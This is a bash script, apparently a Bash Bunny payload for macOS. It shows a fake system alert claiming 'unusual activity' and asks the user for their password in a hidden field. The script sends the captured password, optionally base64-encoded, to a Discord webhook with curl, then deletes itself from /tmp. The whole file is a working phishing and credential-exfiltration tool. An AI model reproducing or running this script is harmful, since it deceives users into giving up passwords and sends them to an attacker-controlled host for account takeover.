#!/bin/bash

# Discord Webhook Link (NEEDED)
discord=""
# The alert's text
dialog="Your Mac has detected unusual activity. Enter your password to confirm that you are a human."
# The alert's icon (for ex. "stop", "caution", "note" or a custom path to an icon)
icon="stop"
# A custom application, that should open the alert (for ex. "Finder")
app=""
# Base64 encode the entered string to prevent an injection/syntax error
base64=false

#### The main script

if [[ ${app} != "" ]]; then
	pwd=$(osascript -e 'tell app "'"${app}"'" to display dialog "'"${dialog}"'" default answer "" with icon '"${icon}"' buttons {"Continue"} default button "Continue" with hidden answer')
elif [[ ${app} == "" ]]; then
	pwd=$(osascript -e 'display dialog "'"${dialog}"'" default answer "" with icon '"${icon}"' buttons {"Continue"} default button "Continue" with hidden answer')
fi


pwd=${pwd#*"button returned:Continue, text returned:"}

if [[ ${base64} == true ]]; then
	pwd=$(echo $pwd | base64)
	curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"The Bash Bunny phished something (Base64 encoded): ${pwd}\"}" ${discord}
else
	curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"The Bash Bunny phished something: ${pwd}\"}" ${discord}
fi

# Self destruct
rm /tmp/script.sh